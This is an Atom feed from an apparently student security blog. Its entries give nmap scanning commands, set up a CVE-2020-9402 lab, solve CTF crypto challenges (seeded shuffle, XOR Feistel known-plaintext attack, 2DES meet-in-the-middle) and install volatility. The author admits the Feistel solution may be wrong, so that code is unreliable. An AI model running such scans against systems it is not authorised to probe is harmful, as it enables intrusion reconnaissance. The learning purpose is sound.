<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HappyCoder&#39;Home</title>
  
  
  <link href="https://zhangkaibin0921.github.io/atom.xml" rel="self"/>
  
  <link href="https://zhangkaibin0921.github.io/"/>
  <updated>2022-04-10T05:34:08.789Z</updated>
  <id>https://zhangkaibin0921.github.io/</id>
  
  <author>
    <name>zhangkaibin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>漏洞扫描工具</title>
    <link href="https://zhangkaibin0921.github.io/2022/04/10/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
    <id>https://zhangkaibin0921.github.io/2022/04/10/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</id>
    <published>2022-04-10T05:33:27.000Z</published>
    <updated>2022-04-10T05:34:08.789Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><p><a href="https://docs.xray.cool/#/README">简介 - xray 安全评估工具文档</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;xray&quot;&gt;&lt;a href=&quot;#xray&quot; class=&quot;headerlink&quot; title=&quot;xray&quot;&gt;&lt;/a&gt;xray&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://docs.xray.cool/#/README&quot;&gt;简介 - xray 安全评估工具文档&lt;/</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>nmap使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/04/09/nmap%E4%BD%BF%E7%94%A8/"/>
    <id>https://zhangkaibin0921.github.io/2022/04/09/nmap%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-09T10:47:44.000Z</published>
    <updated>2022-04-09T14:27:37.991Z</updated>
    
    <content type="html"><![CDATA[<p>nmap是一个免费开放的网络扫描和嗅探的工具包,也叫网络映射器.</p><p>nmap强大之处在于简单.易用. 看一下nmap的基本功能</p><ul><li>探测一组主机是否在线</li><li>扫描主机端口,嗅探所提供的网络服务.</li><li>推断出主机所用的操作系统</li><li>丰富的脚本功能</li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">-<span class="hljs-keyword">A</span>   　　　　　　　　:全面扫描. 综合扫描. 是一种完整扫描目标信息的扫描方式.   <br><br> --exclude　　　　　 : 排除指定的地址  例: nmap  <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>  --exclude <span class="hljs-number">192.168.1.1</span> 那么就不会对<span class="hljs-number">192.168.1.1</span>进行扫描,<br><br>--excludefile 　　　　: 排除指定的地址列表  例: nmap  <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>  --excludefile list.txt 那么就不会对list.txt里面的地址进行扫描,<br><br>-iL　　　　　　　　  : 扫描一个列表文件  例  nmap  -iL  list.txt<br><br>-sP　　　　　　　　: Ping扫描,效率高,返回信息少.  　　例: nmap -sP <span class="hljs-number">192.168.1.110</span> <br><br>-sV　　　　　　　　  : 版本探测 ,通过相应的端口探测对应的服务,根据服务的指纹识别出相应的版本.<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.1.110</span>     单个目标扫描<br><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.1.110</span>    <span class="hljs-number">192.168.1.22</span>  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>. <span class="hljs-number">33</span>  多个目标扫描<br><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.43.10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>    多个目标扫描简写<br><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.1.1</span>-<span class="hljs-number">30</span>　　      指定范围段扫描<br><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.*　　      扫描整个C段<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">端口扫描：<span class="hljs-keyword">nmap</span> -sS  地址<br>默认扫描：<span class="hljs-keyword">nmap</span> 地址<br>指定端口扫描：<span class="hljs-keyword">nmap</span> –<span class="hljs-keyword">p</span> 端口 地址<br>完整扫描到端口、服务及版本：<span class="hljs-keyword">nmap</span> –v –sV 地址<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;nmap是一个免费开放的网络扫描和嗅探的工具包,也叫网络映射器.&lt;/p&gt;
&lt;p&gt;nmap强大之处在于简单.易用. 看一下nmap的基本功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;探测一组主机是否在线&lt;/li&gt;
&lt;li&gt;扫描主机端口,嗅探所提供的网络服务.&lt;/li&gt;
&lt;li&gt;推断出主机所</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>docker简单使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/04/02/docker%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>https://zhangkaibin0921.github.io/2022/04/02/docker%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-02T14:34:26.000Z</published>
    <updated>2022-04-10T05:35:50.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装docker-compose命令"><a href="#安装docker-compose命令" class="headerlink" title="安装docker-compose命令"></a>安装docker-compose命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt upgrade<br><br>pip3 install docker-compose<br>docker-compose -v <br></code></pre></td></tr></table></figure><h2 id="开启漏洞环境"><a href="#开启漏洞环境" class="headerlink" title="开启漏洞环境"></a>开启漏洞环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span>  /django/CVE-2020-9402<br>sudo docker-compose build <span class="hljs-comment">#将镜像拉到本地</span><br>sudo docker-compose up -d<span class="hljs-comment">#启动漏洞环境</span><br>cat   阅读README文件,README文件中含有此项漏洞环境中的所有信息，包括但不限于漏洞介绍、搭建命令、访问方式以及测试验证指南<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装docker-compose命令&quot;&gt;&lt;a href=&quot;#安装docker-compose命令&quot; class=&quot;headerlink&quot; title=&quot;安装docker-compose命令&quot;&gt;&lt;/a&gt;安装docker-compose命令&lt;/h2&gt;&lt;figure c</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>分组密码DES</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/27/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81DES/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/27/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81DES/</id>
    <published>2022-03-27T07:55:21.000Z</published>
    <updated>2022-03-27T12:03:25.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="substitution"><a href="#substitution" class="headerlink" title="substitution"></a>substitution</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> random<br>s=<span class="hljs-number">0x1869f0</span><br>random.seed(s)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(flag,<span class="hljs-built_in">len</span>(flag))))<br><span class="hljs-comment">#9lf5c7504fbea330accg&#123;c-8d6-62e-ef&#125;3aa-d3-34</span><br></code></pre></td></tr></table></figure><p>random.sample函数<br>random.sample(sequence, k)，从指定序列中随机获取指定长度的片断。sample函数不会修改原有序列</p><p>所以random.sample(flag,len(flag))<br>就会将flag随机打乱  （不是真正的随机）</p><p>这一题的random有种子，所以我们可以还原出是如何打乱的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>s=<span class="hljs-number">0x1869f0</span><br>random.seed(s)<br><br>m=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">43</span>):  <br>    m.append(i)<br>m1=random.sample(m,<span class="hljs-built_in">len</span>(m))<br><span class="hljs-built_in">print</span>(m1)<br><br>t=<span class="hljs-string">&#x27;9lf5c7504fbea330accg&#123;c-8d6-62e-ef&#125;3aa-d3-34&#x27;</span><br><br>m2=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">43</span>):<br>    m2.append(i)<br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">43</span>):<br>    m2[m1[i]]=t[i]<br><span class="hljs-built_in">print</span>(m2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(m2))<br></code></pre></td></tr></table></figure><h2 id="Easy-Feistel"><a href="#Easy-Feistel" class="headerlink" title="Easy_Feistel"></a>Easy_Feistel</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>real_flag = <span class="hljs-string">&#x27;flag&#123;?????????????&#125;&#x27;</span><br>fake_flag = <span class="hljs-string">&#x27;flag&#123;Miku_Miku_o~e~o_Miku_Miku_o~e~o_&#125;&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span>(<span class="hljs-params">a, b</span>):</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(x) ^ <span class="hljs-built_in">ord</span>(y)) <span class="hljs-keyword">for</span> (x, y) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> s.encode().<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">swap</span>(<span class="hljs-params">a</span>):</span><br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">16</span>: ] + a[ :<span class="hljs-number">16</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">single</span>(<span class="hljs-params">m, k</span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(m) == <span class="hljs-number">32</span><br>    l = m[: <span class="hljs-number">16</span>]<br>    r = m[<span class="hljs-number">16</span>: ]<br>    nl, nr = r, xor(k, xor(l, r))<br>    <span class="hljs-keyword">return</span> nl + nr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">m, k</span>):</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>                m = single(m, i)<br>        <span class="hljs-keyword">return</span> swap(m)<br><br>k = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):<br>k.append(os.urandom(<span class="hljs-number">8</span>).<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-built_in">print</span>(str_to_hex(encrypt(fake_flag[<span class="hljs-number">5</span>: -<span class="hljs-number">1</span>], k)))<br><span class="hljs-built_in">print</span>(str_to_hex(encrypt(real_flag[<span class="hljs-number">5</span>: -<span class="hljs-number">1</span>], k)))<br><span class="hljs-comment">#3f656c323c3567683e3f613d6d396a62136262205710666e29006c246f79640e</span><br><span class="hljs-comment">#64603b3625637e6f636d63243a2d616a3d683f6025683b66653a34773b3e3968</span><br></code></pre></td></tr></table></figure><p>已知明文攻击<br>首先得要求出密钥k<br>(下面写的异或都是题目中提供的那种逐比特异或)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># nl=l            nr=r</span><br><span class="hljs-comment"># nl=r            nr=l^r^k1</span><br><span class="hljs-comment"># nl=l^r^k1       nr=r ^ (l^r^k1) ^ k2  =l^k1^k2</span><br><span class="hljs-comment"># nl=l^k1^k2      nr=(l^r^k1)^(l^k1^k2) ^k3 =r^k2^k3</span><br><span class="hljs-comment"># nl=r^k2^k3      nr=(l^k1^k2)^(r^k2^k3)^k4=l^r^k1^k3^k4</span><br><span class="hljs-comment"># nl=l^r^k1^k3^k4 nr=(r^k2^k3)^(l^r^k1^k3^k4)^k5=l^k1^k2^k4^k5</span><br><span class="hljs-comment">#……</span><br></code></pre></td></tr></table></figure><blockquote><p>l和r是常量，分别是明文的左半和右半<br>nl和nr是变量<br>我现在知道明文l和r，和最后一次的nl和nr<br>我要还原出k1~k256</p><p>现在就看上面列的到k5的例子<br>我想要还原出上一步nl和nr<br>(上一步的nr) = nl     ;     (上一步的nl)=nl^nr^k5<br>但需要求的就是k5，然后应该怎么写？</p></blockquote><p>这是我的一个疑问，我一开始以为必须要把k1~k256全部都求出来，我想的是因为Feistel解密的时候，需要把加密的密钥逆序。但是这一题密钥不需要逆序，因为这一题的F函数是异或，异或本身就是对称的，所以不需要逆序。(其实不用想太多Feistel，正常写就可以了)</p><p>所以再看上面列的到k5的例子<br>我们可以求出<code>k1^k2^k4^k5</code> 和<code>k1^k3^k4</code><br>设flag密文的左半和右半分别位nl和nr<br>所以<code>l=(k1^k2^k4^k5)^nr</code>   <code>r=(k1^k3^k4)^l^nl</code><br>所以大概就是这个意思<br>但是不能忘记最后一步就是交换l和r</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos"># nl=<span class="hljs-keyword">r</span>            nr=<span class="hljs-keyword">l</span><span class="hljs-symbol">^r</span><span class="hljs-symbol">^k1</span><br># nl=<span class="hljs-keyword">l</span><span class="hljs-symbol">^r</span><span class="hljs-symbol">^k1</span>       nr=<span class="hljs-keyword">r</span> ^ (<span class="hljs-keyword">l</span><span class="hljs-symbol">^r</span><span class="hljs-symbol">^k1</span>) ^ k2  =<span class="hljs-keyword">l</span><span class="hljs-symbol">^k1</span><span class="hljs-symbol">^k2</span><br># nl=<span class="hljs-keyword">l</span><span class="hljs-symbol">^k1</span><span class="hljs-symbol">^k2</span>      nr=(<span class="hljs-keyword">l</span><span class="hljs-symbol">^r</span><span class="hljs-symbol">^k1</span>)^(<span class="hljs-keyword">l</span><span class="hljs-symbol">^k1</span><span class="hljs-symbol">^k2</span>) <span class="hljs-symbol">^k3</span> =<span class="hljs-keyword">r</span><span class="hljs-symbol">^k2</span><span class="hljs-symbol">^k3</span><br># nl=<span class="hljs-keyword">r</span><span class="hljs-symbol">^k2</span><span class="hljs-symbol">^k3</span>      nr=(<span class="hljs-keyword">l</span><span class="hljs-symbol">^k1</span><span class="hljs-symbol">^k2</span>)^(<span class="hljs-keyword">r</span><span class="hljs-symbol">^k2</span><span class="hljs-symbol">^k3</span>)<span class="hljs-symbol">^k4</span>=<span class="hljs-keyword">l</span><span class="hljs-symbol">^r</span><span class="hljs-symbol">^k1</span><span class="hljs-symbol">^k3</span><span class="hljs-symbol">^k4</span><br># nl=<span class="hljs-keyword">l</span><span class="hljs-symbol">^r</span><span class="hljs-symbol">^k1</span><span class="hljs-symbol">^k3</span><span class="hljs-symbol">^k4</span> nr=(<span class="hljs-keyword">r</span><span class="hljs-symbol">^k2</span><span class="hljs-symbol">^k3</span>)^(<span class="hljs-keyword">l</span><span class="hljs-symbol">^r</span><span class="hljs-symbol">^k1</span><span class="hljs-symbol">^k3</span><span class="hljs-symbol">^k4</span>)<span class="hljs-symbol">^k5</span>=<span class="hljs-keyword">l</span><span class="hljs-symbol">^k1</span><span class="hljs-symbol">^k2</span><span class="hljs-symbol">^k4</span><span class="hljs-symbol">^k5</span><br></code></pre></td></tr></table></figure><p>发现是三个一循环<br>第一次nl只要r，nr有l和r<br>第二次nl有l和r，nr只有l<br>第三次nl只有l，nr只有r</p><p>所以第256是nl只要r，nr有l和r<br>所以就看这一个<code>nl=r^k2^k3      nr=(l^k1^k2)^(r^k2^k3)^k4=l^r^k1^k3^k4</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><br><span class="hljs-attribute">def</span> xor(a, b):<br><span class="hljs-attribute">return</span> &#x27;&#x27;.join(chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b))<br><br><span class="hljs-attribute">c1</span>=<span class="hljs-number">0</span>x<span class="hljs-number">3</span>f<span class="hljs-number">656</span>c<span class="hljs-number">323</span>c<span class="hljs-number">3567683</span>e<span class="hljs-number">3</span>f<span class="hljs-number">613</span>d<span class="hljs-number">6</span>d<span class="hljs-number">396</span>a<span class="hljs-number">62136262205710666</span>e<span class="hljs-number">29006</span>c<span class="hljs-number">246</span>f<span class="hljs-number">79640</span>e<br><span class="hljs-attribute">c2</span>=<span class="hljs-number">0</span>x<span class="hljs-number">64603</span>b<span class="hljs-number">3625637</span>e<span class="hljs-number">6</span>f<span class="hljs-number">636</span>d<span class="hljs-number">63243</span>a<span class="hljs-number">2</span>d<span class="hljs-number">616</span>a<span class="hljs-number">3</span>d<span class="hljs-number">683</span>f<span class="hljs-number">6025683</span>b<span class="hljs-number">66653</span>a<span class="hljs-number">34773</span>b<span class="hljs-number">3</span>e<span class="hljs-number">3968</span><br><span class="hljs-attribute">c1</span>=long_to_bytes(c<span class="hljs-number">1</span>)<br><span class="hljs-attribute">c2</span>=long_to_bytes(c<span class="hljs-number">2</span>)<br><span class="hljs-attribute">m1</span>=&#x27;flag&#123;Miku_Miku_o~e~o_Miku_Miku_o~e~o_&#125;&#x27;<br><span class="hljs-attribute">c1</span>=c<span class="hljs-number">1</span>.decode(encoding=&#x27;gbk&#x27;)<br><span class="hljs-attribute">c2</span>=c<span class="hljs-number">2</span>.decode(encoding=&#x27;utf-<span class="hljs-number">8</span>&#x27;)<br><br><br><span class="hljs-attribute">nl</span>=c<span class="hljs-number">1</span>[:<span class="hljs-number">16</span>]<br><span class="hljs-attribute">nr</span>=c<span class="hljs-number">1</span>[<span class="hljs-number">16</span>:]<br><span class="hljs-attribute">m1</span>=m<span class="hljs-number">1</span>[<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>]<br><br><span class="hljs-attribute">l</span>=m<span class="hljs-number">1</span>[:<span class="hljs-number">16</span>]<br><span class="hljs-attribute">r</span>=m<span class="hljs-number">1</span>[<span class="hljs-number">16</span>:]<br><span class="hljs-attribute">temp1</span>=xor(xor(l,r),nr)<br><span class="hljs-attribute">temp2</span>=xor(nl,r)<br><br><span class="hljs-attribute">nl</span>=c<span class="hljs-number">2</span>[:<span class="hljs-number">16</span>]<br><span class="hljs-attribute">nr</span>=c<span class="hljs-number">2</span>[<span class="hljs-number">16</span>:]<br><span class="hljs-attribute">r</span>=xor(nl,temp<span class="hljs-number">2</span>)<br><span class="hljs-attribute">l</span>=xor(xor(nr,temp<span class="hljs-number">1</span>),r)<br><span class="hljs-attribute">print</span>(l)<br><span class="hljs-attribute">print</span>(r)<br></code></pre></td></tr></table></figure><p>最后我提交还是有点问题，但大概应该就是这么写的（我也不确定，哈）</p><h2 id="2DES"><a href="#2DES" class="headerlink" title="2DES"></a>2DES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyDes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><span class="hljs-comment">#from secret import flag</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span>(<span class="hljs-params">msg</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg)%<span class="hljs-number">16</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> msg<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> msg+(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(msg)%<span class="hljs-number">16</span>)*<span class="hljs-built_in">chr</span>(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(msg)%<span class="hljs-number">16</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_key</span>():</span><br>    s=<span class="hljs-string">&#x27;0123456789abcdef&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*<span class="hljs-string">&#x27;&#x27;</span>.join([s[random.randint(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)-<span class="hljs-number">1</span>)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Des_Encrypt</span>(<span class="hljs-params">msg,key</span>):</span><br>    <br>    DES=des(key)<br>    <br>    <span class="hljs-keyword">return</span> DES.encrypt(msg)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Des_Decrypt</span>(<span class="hljs-params">cipher,key</span>):</span><br>    <br>    DES=des(key)<br><br>    <span class="hljs-keyword">return</span> DES.decrypt(cipher)<br><br><br>flag=<span class="hljs-string">b&#x27;flag&#123;????????????????&#125;&#x27;</span><br>hint=<span class="hljs-string">b&#x27;maybe_my_2DES_is_secure?&#x27;</span><br><br>k1=get_key()<br>k2=get_key()<br><br>En_hint=Des_Encrypt(Des_Encrypt(pad(hint),k1),k2)<br><span class="hljs-built_in">print</span>(base64.b64encode(En_hint))<br><br><span class="hljs-comment">#Lga6vE5utuDUKgcX2PMjEXD+jm3NR+HLOLaYfpsyTe4=</span><br><br>cipher=Des_Encrypt(Des_Encrypt(pad(flag),k1),k2)<br><span class="hljs-built_in">print</span>(base64.b64encode(cipher))<br><span class="hljs-comment">#9G3/1zcKuoFe5Hx/1uFS2x3nS90vgDPCAgsWwi37Z9pXaWKCCfkgMkGMiJ8Mjhay</span><br></code></pre></td></tr></table></figure><p>已知一个明密文对，需要求出k1和k2<br>2重DES会有中间相遇攻击<code>En_hint=Des_Encrypt(Des_Encrypt(pad(hint),k1),k2)</code><br>因为key的范围不是很大，所以可以爆破<br>我们先穷举k1，将m1用k1加密的结果都存放在一个字典中<br>然后再穷举k2，判断c1用k2解密的结果在不在刚才的字典中<br>如果在，则k1和k2就是我们要找的key</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;substitution&quot;&gt;&lt;a href=&quot;#substitution&quot; class=&quot;headerlink&quot; title=&quot;substitution&quot;&gt;&lt;/a&gt;substitution&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>misc内存取证</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/26/misc%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/26/misc%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</id>
    <published>2022-03-26T14:37:19.000Z</published>
    <updated>2022-03-26T15:02:41.683Z</updated>
    
    <content type="html"><![CDATA[<h2 id="volatility安装"><a href="#volatility安装" class="headerlink" title="volatility安装"></a>volatility安装</h2><p>我是用kali安装的<br><a href="https://www.volatilityfoundation.org/releases">https://www.volatilityfoundation.org/releases</a><br><img src="/picture/misc93.png"></p><p>看下kali的环境变量  <code>echo $PATH</code><br><img src="/picture/misc95.png"></p><p><img src="/picture/misc94.png"><br>可能会没有权限改名<br>terminal中用root用户使用mv指令<br>然后也用mv指令把刚才改名的那一个移动到任意一个环境变量中即可<br><code>mv /usr/local/sbin/volatility_2.6_lin64_standalone volatility</code><br><img src="/picture/misc96.png"><br>这就可以用了</p><h2 id="volatility使用"><a href="#volatility使用" class="headerlink" title="volatility使用"></a>volatility使用</h2><p>获取镜像基本信息<br><code>volatility -f ./memory imageinfo</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;volatility安装&quot;&gt;&lt;a href=&quot;#volatility安装&quot; class=&quot;headerlink&quot; title=&quot;volatility安装&quot;&gt;&lt;/a&gt;volatility安装&lt;/h2&gt;&lt;p&gt;我是用kali安装的&lt;br&gt;&lt;a href=&quot;https:/</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-23T14:23:42.000Z</published>
    <updated>2022-03-28T14:12:13.904Z</updated>
    
